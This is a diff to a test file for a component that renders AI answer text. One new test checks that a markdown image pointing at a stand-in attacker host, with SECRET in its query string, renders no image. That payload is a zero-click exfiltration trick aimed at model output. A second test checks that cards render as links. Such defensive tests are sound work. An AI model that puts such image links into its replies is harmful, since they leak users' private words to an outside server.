@@ -76,6 +76,20 @@ describe('AnswerParts', () => {
     expect(out).toContain('<table')
   })
 
+  it('draws no image from a model\'s text: an address could carry private words out with no click', () => {
+    const out = html([{ about: [], text: 'Look ![the chart](https://evil.example/p.png?d=SECRET) here.' }])
+    expect(out).not.toContain('<img')
+    expect(out).not.toContain('evil.example')
+    expect(out).toContain('the chart')
+  })
+
+  it('opens a role or a company from its card by link, even when the page also opens made things in the panel', () => {
+    const out = renderToStaticMarkup(<AnswerParts parts={[{ card: { kind: 'role', ref: 'r1' } }, { card: { kind: 'company', ref: 'c1' } }]} names={names} tileCount={2} cards={[role, company]} onOpen={() => undefined} />)
+    expect(out).toContain('href="/roles/r1"')
+    expect(out).toContain('href="/companies/c1"')
+    expect(out).not.toMatch(/<button[^>]*>Open</)
+  })
+
   it('has Copy on each text part, and says "No longer listed" for a thing it has no name for', () => {
     const out = html([{ about: [{ kind: 'role', ref: 'gone' }], text: 'Text.' }])
     expect(out).toContain('aria-label="Copy"')
